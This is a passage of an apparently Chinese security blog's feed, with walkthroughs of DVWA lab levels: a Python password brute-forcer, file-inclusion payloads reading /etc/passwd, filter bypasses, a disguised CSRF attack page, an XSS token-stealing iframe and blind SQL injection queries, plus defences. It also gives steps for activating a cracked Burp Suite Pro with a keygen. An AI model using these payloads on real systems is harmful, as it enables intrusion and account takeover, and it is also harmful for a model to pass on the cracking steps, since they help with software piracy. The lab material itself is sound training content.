response.read()</span><br><span class="line">print len(the_page)</span><br><span class="line">soup = BeautifulSoup(the_page,&quot;html.parser&quot;)</span><br><span class="line">user_token = soup.select(&apos;input[type=&quot;hidden&quot;]&apos;)[0].get(&apos;value&apos;) #get the user_token</span><br><span class="line">return user_token</span><br><span class="line"></span><br><span class="line">user_token = get_token(requrl,header)</span><br><span class="line">i=0</span><br><span class="line">for line in open(&quot;wordlist.txt&quot;):</span><br><span class="line">requrl = &quot;http://172.16.12.93/vulnerabilities/brute/&quot;+&quot;?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token</span><br><span class="line">i = i+1</span><br><span class="line">print i,&apos;admin&apos;,line.strip(),</span><br><span class="line">user_token = get_token(requrl,header)</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/brute force/10.png" alt="10.png"></p><h2 id="使用BurpSuite进行暴力破解-1"><a href="#使用BurpSuite进行暴力破解-1" class="headerlink" title="使用BurpSuite进行暴力破解"></a>使用BurpSuite进行暴力破解</h2><ol><li><p>首先，进行抓包</p><p> <img src="/images/baji/dvwa/brute force/11.png" alt="11.png"></p></li><li><p>将其发送到<code>Intruder</code>模块</p><p> 将<code>password</code>字段、<code>user_token</code>字段设置为要破解的字段</p><p> 设置攻击模式为<code>Pitchfork</code></p><p> <img src="/images/baji/dvwa/brute force/12.png" alt="12.png"></p></li><li><p>将<code>HTTP</code>请求的线程数设置为1</p><p> <img src="/images/baji/dvwa/brute force/13.png" alt="13.png"></p></li><li><p>设置<code>Grep-Extract</code>处，选择<code>Add</code></p><p> <img src="/images/baji/dvwa/brute force/14.png" alt="14.png"></p></li><li><p>设置需要从响应中获取的信息</p><ol><li><p>点击获取响应</p></li><li><p>选择<code>user_token</code>的值，并复制</p></li><li><p>点击<code>OK</code></p><p><img src="/images/baji/dvwa/brute force/15.png" alt="15.png"></p></li></ol></li><li><p>设置<code>payloads</code></p><p> 第一个字典类型选择简单的列表，选择密码字典</p><p> 第二个字典类型选择递归<code>grep</code>，填写第一次请求所使用的<code>payload</code>，即上一步复制的<code>user_token</code>的值</p><p> 设置完成后，开始攻击</p><p> <img src="/images/baji/dvwa/brute force/16.png" alt="16.png"></p></li><li><p>通过一段时间的暴力破解，即可破解出密码</p><p> <img src="/images/baji/dvwa/brute force/17.png" alt="17.png"></p></li></ol><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续</p><p><img src="/images/baji/dvwa/brute force/9.png" alt="9.png"></p><p>采用了更为安全的<code>PDO（PHP Data Object）</code>机制防御<code>SQL</code>注入</p><hr><h1 id="暴力破解防御"><a href="#暴力破解防御" class="headerlink" title="暴力破解防御"></a>暴力破解防御</h1><ol><li><p>使用高强度的密码(至少8位，数字、大写字母、小写字母、特殊符号)</p></li><li><p>设置登陆失败限制次数</p></li><li><p>设置密码历史，强制密码修改期限等密码策略</p></li></ol><hr><h1 id="安装python第三方软件包bs4"><a href="#安装python第三方软件包bs4" class="headerlink" title="安装python第三方软件包bs4"></a>安装python第三方软件包bs4</h1><h2 id="在线安装"><a href="#在线安装" class="headerlink" title="在线安装"></a>在线安装</h2><ol><li><p>进入<code>python</code>安装目录下的<code>Script</code>目录</p></li><li><p>安装</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure></li></ol><h2 id="离线安装"><a href="#离线安装" class="headerlink" title="离线安装"></a>离线安装</h2><ol><li><p><code>bs4</code>官网下载<code>tar.gz</code>包</p></li><li><p>将压缩包解压至<code>python</code>安装目录下,进入解压文件后输入指令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之文件包含</title>
    <link href="http://yoursite.com/2019/05/20/DVWA1-10%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://yoursite.com/2019/05/20/DVWA1-10之文件包含/</id>
    <published>2019-05-20T15:34:00.000Z</published>
    <updated>2020-02-24T04:19:11.172Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>文件包含漏洞，是指当服务器开启<code>allow_url_include</code>选项和<code>allow_url_fopen</code>选项时，就可以通过<code>php</code>的某些特性函数（<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>）利用<code>url</code>去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取</p><p>文件包含漏洞分为本地文件包含漏洞(<code>LFI</code>)与远程文件包含漏洞(<code>RFI</code>)，远程文件包含漏洞是因为开启了<code>php</code>配置中的<code>allow_url_include</code>选项（选项开启之后，服务器允许包含一个远程的文件）</p><hr><h1 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h1><p>点击页面中的连接，会对相应的文件进行包含</p><p><img src="/images/baji/dvwa/file inclusion/1.png" alt="1.png"></p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>构造绝对路径<code>URL</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/2.png" alt="2.png"></p><p>构造相对路径<code>URL</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/5.png" alt="5.png"></p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>远端服务器主页：</p><p><img src="/images/baji/dvwa/file inclusion/3.png" alt="3.png"></p><p>构造<code>URL</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=http://192.168.1.3/</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/4.png" alt="4.png"></p><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p><code>Medium</code>级别的代码增加了<code>str_replace</code>函数，对<code>page</code>参数进行了一定的处理，将<code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code>替换为空字符，即删除</p><h2 id="本地文件包含-1"><a href="#本地文件包含-1" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>可以以绝对路径来绕过<code>../</code>、<code>..\</code>过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/6.png" alt="6.png"></p><h2 id="远程文件包含-1"><a href="#远程文件包含-1" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>以双写绕过<code>http://</code>、<code>https://</code>过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=hthttp://tp://192.168.1.3/</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/7.png" alt="7.png"></p><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p><code>High</code>级别的代码使用了<code>fnmatch</code>函数检查<code>page</code>参数，要求<code>page</code>参数的开头必须是<code>file</code>开头的文件</p><p>可以利用<code>file</code>协议绕过防护策略</p><p>当用浏览器打开一个<strong>本地文件</strong>时，使用的就是<code>file</code>协议</p><p>构造<code>URL</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=file:///etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/8.png" alt="8.png"></p><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码使用了白名单机制进行防护，简单粗暴，<code>page</code>参数必须为<code>include.php</code>、<code>file1.php”、“file2.php</code>、<code>file3.php</code>之一，彻底杜绝了文件包含漏洞</p><hr><h1 id="文件包含防御"><a href="#文件包含防御" class="headerlink" title="文件包含防御"></a>文件包含防御</h1><ol><li><p><code>PHP</code>中使用<code>open_basedir</code>配置，将访问限制在指定区域</p></li><li><p>过滤<code>../</code>、<code>..\</code>等等特殊字符</p></li><li><p>禁止服务器远程文件包含(<code>allow_url_include</code>设置为<code>Off</code>)</p></li><li><p>白名单限制可包含的文件</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之CSRF</title>
    <link href="http://yoursite.com/2019/05/20/DVWA1-10%E4%B9%8BCSRF/"/>
    <id>http://yoursite.com/2019/05/20/DVWA1-10之CSRF/</id>
    <published>2019-05-20T15:20:00.000Z</published>
    <updated>2020-02-24T04:19:33.706Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h1><p><code>CSRF</code>，跨站请求伪造，是指利用受害者尚未失效的身份认证信息（<code>cookie</code>、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）</p><p><code>CSRF</code>与<code>XSS</code>最大的区别就在于，<code>CSRF</code>并没有盗取<code>cookie</code>，而是直接利用</p><hr><h1 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h1><h2 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h2><ol><li><p>构造恶意链接</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/csrf/?password_new=password123&amp;password_conf=password123&amp;Change=Change#</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>被攻击者在登陆网站的情况下点击恶意链接</p></li><li><p>被攻击者密码在不知情的情况下被修改</p><p> <img src="/images/baji/dvwa/CSRF/1.png" alt="1.png"></p></li></ol><h2 id="简单伪装"><a href="#简单伪装" class="headerlink" title="简单伪装"></a>简单伪装</h2><ol><li><p>网址缩短</p><p> <img src="/images/baji/dvwa/CSRF/2.png" alt="2.png"></p><p> 使受害者无法通过域名分辨</p></li><li><p>再次修改密码</p><p> 当点击短链接后，会自动跳转到长网址，进行密码修改</p></li></ol><h2 id="加强伪装"><a href="#加强伪装" class="headerlink" title="加强伪装"></a>加强伪装</h2><ol><li><p>构造攻击页面</p><p> 即使<code>URL</code>地址被缩短，但被点击后，仍然会跳转原<code>URL</code>地址，并且会提示密码被修改，使得被攻击者发觉密码被修改</p><p> 现实攻击场景下，需要在公网上事先上传一个攻击页面，诱使被攻击者去访问，真正能够在受害者不知情的情况下完成<code>CSRF</code>攻击</p><p> 此处，使用192.168.1.4作为公网服务器，用于演示</p><p> 攻击页面<code>test.html</code>代码</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  &lt;html&gt;</span><br><span class="line">       &lt;body&gt;</span><br><span class="line">               &lt;img src=&quot;http://172.16.12.93/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line">               &lt;h1&gt;error&lt;/h1&gt;</span><br><span class="line">               &lt;h2&gt;404&lt;/h2&gt;</span><br><span class="line">       &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>当被攻击者在登陆<code>DVWA</code>的情况下，点击攻击页面的链接，误以为自己点击一个失效的<code>URL</code>,但实际上已经遭受到<code>CSRF</code>攻击，密码已经被修改</p><p> <img src="/images/baji/dvwa/CSRF/3.png" alt="3.png"></p></li></ol><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p><code>Medium</code>级别检查了<code>http</code>包头的<code>Referer</code>参数的值，查看其中是否包含<code>http</code>包头的<code>Host</code>参数，希望通过这种机制抵御<code>CSRF</code>攻击</p><p><img src="/images/baji/dvwa/CSRF/4.png" alt="4.png"></p><p>修改攻击页面名称为<code>DVWA</code>主机地址，即可绕过</p><p><img src="/images/baji/dvwa/CSRF/5.png" alt="5.png"></p><p><img src="/images/baji/dvwa/CSRF/6.png" alt="6.png"></p><p><img src="/images/baji/dvwa/CSRF/7.png" alt="7.png"></p><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p><code>High</code>级别的代码加入了<code>Anti-CSRF token</code>机制，用户每次访问改密页面时，服务器会返回一个随机的<code>token</code>，向服务器发起请求时，需要提交<code>token</code>参数，而服务器在收到请求时，会优先检查<code>token</code>，只有<code>token</code>正确，才会处理客户端的请求</p><p><img src="/images/baji/dvwa/CSRF/8.png" alt="8.png"></p><p>进行漏洞利用，要绕过<code>High</code>级别的反<code>CSRF</code>机制，关键是要获取<code>token</code></p><ol><li><p>利用<code>High</code>级别存储型<code>XSS</code>获取<code>token</code></p><p> 注入代码：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt;</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/CSRF/9.png" alt="9.png"></p><p> <img src="/images/baji/dvwa/CSRF/10.png" alt="10.png"></p></li><li><p>构造一次性修改密码恶意链接</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/csrf/?password_new=password123&amp;password_conf=password123&amp;Change=Change&amp;user_token=0aeba5f4c30a41b5df742056e383a2e9#</span><br></pre></td></tr></table></figure><p> 在登陆<code>DVWA</code>的情况下，点击链接，则会更改密码</p><p> <img src="/images/baji/dvwa/CSRF/11.png" alt="11.png"></p><p> 但恶意链接只可使用一次，再次请求则会显示错误</p><p> <img src="/images/baji/dvwa/CSRF/12.png" alt="12.png"></p></li></ol><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p>在修改密码时，要求输入原始密码，用于防止<code>CSRF</code>攻击</p><hr><h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><ol><li><p>设置<code>Referer</code>，用于标识此次请求从哪个页面过来的</p></li><li><p><code>Anti CSRF Token</code></p></li><li><p>重要操作进行二次验证</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之SQL盲注</title>
    <link href="http://yoursite.com/2019/05/19/VWA1-10%E4%B9%8BSQL%E7%9B%B2%E6%B3%A8/"/>
    <id>http://yoursite.com/2019/05/19/VWA1-10之SQL盲注/</id>
    <published>2019-05-19T12:16:00.000Z</published>
    <updated>2020-02-24T04:19:51.235Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h1><p><code>SQL Injection（Blind）</code>，即<code>SQL</code>盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的<code>SQL</code>注入漏洞大多是<code>SQL</code>盲注</p><p>手工盲注的步骤:</p><ol><li><p>判断是否存在注入，注入是字符型还是数字型</p></li><li><p>猜解当前数据库名</p></li><li><p>猜解数据库中的表名</p></li><li><p>猜解表中的字段名</p></li><li><p>猜解数据</p></li></ol><p><code>DVWA</code>中<code>SQL</code>语句查询只会返回两种结果:</p><ol><li><p>正常输入</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/1.png" alt="1.png"></p></li><li><p>非正常输入</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/2.png" alt="2.png"></p></li></ol><p>所以为<code>SQL</code>盲注</p><hr><h1 id="LOW级别漏洞利用"><a href="#LOW级别漏洞利用" class="headerlink" title="LOW级别漏洞利用"></a>LOW级别漏洞利用</h1><p>基于布尔的盲注</p><h2 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h2><ol><li><p>输入1，显示相应用户存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/3.png" alt="3.png"></p></li><li><p>输入<code>1&#39; and 1=1--</code>，显示相应用户存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/4.png" alt="4.png"></p></li><li><p>输入<code>1&#39; and 1=2--</code>，显示用户不存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/5.png" alt="5.png"></p></li></ol><p>存在<code>SQL</code>注入漏洞，且为字符型</p><h2 id="猜解当前数据库名"><a href="#猜解当前数据库名" class="headerlink" title="猜解当前数据库名"></a>猜解当前数据库名</h2><p>首先猜解数据库名长度，然后逐个猜解字符</p><h3 id="猜解数据库名长度"><a href="#猜解数据库名长度" class="headerlink" title="猜解数据库名长度"></a>猜解数据库名长度</h3><ol><li><p>输入<code>1&#39; and length(database())=1--</code>，显示用户不存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/6.png" alt="6.png"></p></li><li><p>输入<code>1&#39; and length(database())=2--</code>，显示用户不存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/7.png" alt="7.png"></p></li><li><p>输入<code>1&#39; and length(database())=3--</code>，显示用户不存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/8.png" alt="8.png"></p></li><li><p>输入<code>1&#39; and length(database())=4--</code>，显示相应用户存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/9.png" alt="9.png"></p></li></ol><p>说明数据库名长度为4</p><h3 id="逐个猜解数据库名"><a href="#逐个猜解数据库名" class="headerlink" title="逐个猜解数据库名"></a>逐个猜解数据库名</h3><p>二分法猜解数据库名</p><ol><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&gt;97--</code>，显示相应用户存在(小写字母<code>a</code>)</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/10.png" alt="10.png"></p><p> 说明数据库名的第一个字符的<code>ascii</code>值大于97</p></li><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&lt;122--</code>，显示相应用户存在(小写字母<code>z</code>)</p><p> 说明数据库名的第一个字符的<code>ascii</code>值小于122</p></li><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&lt;109--</code>，显示相应用户存在(小写字母<code>m</code>)</p><p> 说明数据库名的第一个字符的<code>ascii</code>值小于109</p></li><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&lt;103--</code>，显示相应用户存在(小写字母<code>g</code>)</p><p> 说明数据库名的第一个字符的<code>ascii</code>值小于103</p></li><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&lt;100--</code>，显示用户不存在(小写字母<code>d</code>)</p><p> 说明数据库名的第一个字符的<code>ascii</code>值不小于100</p></li><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&lt;101--</code>，显示相应用户存在(小写字母<code>f</code>)</p><p> 说明数据库名的第一个字符的<code>ascii</code>值小于101</p><p> 说明数据库名的第一个字符的<code>ascii</code>值为100，即字母<code>d</code></p></li></ol><p>重复上述步骤，可完全猜解出数据库名<code>dvwa</code></p><h2 id="猜解数据库中的表名"><a href="#猜解数据库中的表名" class="headerlink" title="猜解数据库中的表名"></a>猜解数据库中的表名</h2><p>首先猜解数据库中表的数量，再逐个猜解表名</p><h3 id="猜解数据库中表的数量"><a href="#猜解数据库中表的数量" class="headerlink" title="猜解数据库中表的数量"></a>猜解数据库中表的数量</h3><ol><li><p>输入<code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=1--</code>，显示不存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/11.png" alt="11.png"></p></li><li><p>输入<code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=2--</code>，显示相应用户存在</p><p><img src="/images/baji/dvwa/SQL Injection Blind/12.png" alt="12.png"></p></li></ol><p>说明<code>dvwa</code>数据库中共有两个表</p><h3 id="逐个猜解表名"><a href="#逐个猜解表名" class="headerlink" title="逐个猜解表名"></a>逐个猜解表名</h3><h4 id="逐个猜解表名的长度"><a href="#逐个猜解表名的长度" class="headerlink" title="逐个猜解表名的长度"></a>逐个猜解表名的长度</h4><ol><li><p>输入<code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1--</code>，显示用户不存在</p></li><li><p>输入<code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2--</code>，显示用户不存在</p></li><li><p>。。。。。</p></li><li><p>输入<code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9--</code>，显示相应用户存在</p></li></ol><p>说明第一个表名长度为9</p><h4 id="逐个猜解表名-1"><a href="#逐个猜解表名-1" class="headerlink" title="逐个猜解表名"></a>逐个猜解表名</h4><ol><li><p>输入<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97--</code>，显示存在</p></li><li><p>输入<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122--</code>，显示存在</p></li><li><p>输入<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109--</code>，显示存在</p></li><li><p>输入<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103--</code>，显示不存在</p></li><li><p>输入<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103--</code>,显示不存在</p></li></ol><p>说明第一个表的名字的第一个字符为小写字母<code>g</code>(<code>ascii</code>码103)</p><p>重复上述步骤，即可猜解出两个表名（<code>guestbook</code>、<code>users</code>）</p><h2 id="猜解表中的字段名"><a href="#猜解表中的字段名" class="headerlink" title="猜解表中的字段名"></a>猜解表中的字段名</h2><h3 id="猜解表中字段的数量"><a href="#猜解表中字段的数量" class="headerlink" title="猜解表中字段的数量"></a>猜解表中字段的数量</h3><ol><li><p>输入<code>1&#39; and (select count(column_name) from information_schema.columns where table_name= &#39;users&#39;)=1--</code>，显示不存在</p></li><li><p>。。。</p></li><li><p>输入<code>1&#39; and (select count(column_name) from information_schema.columns where table_name= &#39;users&#39;)=8--</code>，显示存在</p></li></ol><p>说明<code>users</code>表有8个字段</p><h3 id="逐个猜解字段名长度"><a href="#逐个猜解字段名长度" class="headerlink" title="逐个猜解字段名长度"></a>逐个猜解字段名长度</h3><ol><li><p>输入<code>1&#39; and length(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1))=1--</code>，显示不存在</p></li><li><p>。。。</p></li><li><p>输入<code>1&#39; and length(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1))=7--</code>，显示存在</p></li></ol><p>说明<code>users</code>表的第一个字段为7个字符长度</p><h3 id="逐个猜解字段名"><a href="#逐个猜解字段名" class="headerlink" title="逐个猜解字段名"></a>逐个猜解字段名</h3><ol><li><p>输入<code>1&#39; and ascii(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1,1))&gt;97--</code>，显示存在</p></li><li><p>。。。</p></li></ol><p>采用二分法，即可猜解出所有字段名<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>user</code>,<code>password</code>,<code>avatar</code>,<code>last_login</code>,<code>failed_login</code></p><h2 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h2><ol><li><p>输入<code>1&#39; and ascii(substr((select user from users limit 0,1),1,1))&gt;97--</code>，显示不存在</p></li><li><p>。。。</p></li></ol><p>即可猜解出数据</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>Burp Suite</title>
    <link href="http://yoursite.com/2019/05/17/urpSuite/"/>
    <id>http://yoursite.com/2019/05/17/urpSuite/</id>
    <published>2019-05-17T12:23:00.000Z</published>
    <updated>2020-02-24T04:27:10.024Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>Burp Suite</code>是用于攻击<code>web</code>应用程序的集成平台，包含了许多工具.它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示<code>HTTP</code>消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架</p><p><code>Burp Suite</code>是一个<code>Java</code>应用程序，并分发作为一个独立的<code>.jar</code>扩展的<code>Java</code>可执行文件</p><p><code>Burp Suite</code>的模块几乎包含整个安全测试过程，从最初对目标程序的信息采集，到漏洞扫描及其利用，多模块间高融合的配合，使得安全测试的过程更加高效</p><p>具体模块分类为：</p><ol><li><p><code>Dashboard</code>(仪表盘)——显示任务、实践日志等</p></li><li><p><code>Target</code>(目标)——显示目标目录结构的的一个功能</p></li><li><p><code>Proxy</code>(代理)——拦截<code>HTTP/HTTPS</code>的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流</p></li><li><p><code>Intruder</code>(入侵)——一个定制的高度可配置的工具，对<code>web</code>应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用<code>fuzzing</code>技术探测常规漏洞</p></li><li><p><code>Repeater</code>(中继器)——一个靠手动操作来触发单独的<code>HTTP</code>请求，并分析应用程序响应的工具</p></li><li><p><code>Sequencer</code>(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具</p></li><li><p><code>Decoder</code>(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具</p></li><li><p><code>Comparer</code>(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”</p></li><li><p><code>Extender</code>(扩展)——可以让你加载<code>Burp Suite</code>的扩展，使用你自己的或第三方代码来扩展<code>Burp Suit</code>的功能</p></li><li><p><code>Options</code>(设置)——包括<code>Project options</code>和<code>User options</code>，是对<code>Burp Suite</code>的一些设置</p></li></ol><p><img src="/images/shentouceshi_tools/Burp Suite/1.png" alt="1.png"></p><hr><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="配置java环境"><a href="#配置java环境" class="headerlink" title="配置java环境"></a>配置java环境</h2><p>版本<code>jdk</code>1.8</p><h2 id="Burp-Suite破解版"><a href="#Burp-Suite破解版" class="headerlink" title="Burp Suite破解版"></a>Burp Suite破解版</h2><ol><li><p>运行<code>burp-loader-keygen-jas502n.jar</code>程序，点击<code>run</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/2.png" alt="2.png"></p></li><li><p>此时会自动打开文件<code>burpsuite_pro_v2.0.11beta.jar</code>，点击<code>I Accept</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/3.png" alt="3.png"></p></li><li><p>输入<code>license</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/4.png" alt="4.png"></p></li><li><p>选择<code>manual activation</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/5.png" alt="5.png"></p></li><li><p>复制<code>Activation Request</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/6.png" alt="6.png"></p></li><li><p>复制<code>Activation Response</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/7.png" alt="7.png"></p></li><li><p>成功，可以使用</p><p> <img src="/images/shentouceshi_tools/Burp Suite/8.png" alt="8.png">    </p></li></ol><hr><h1 id="Burp-Suite使用"><a href="#Burp-Suite使用" 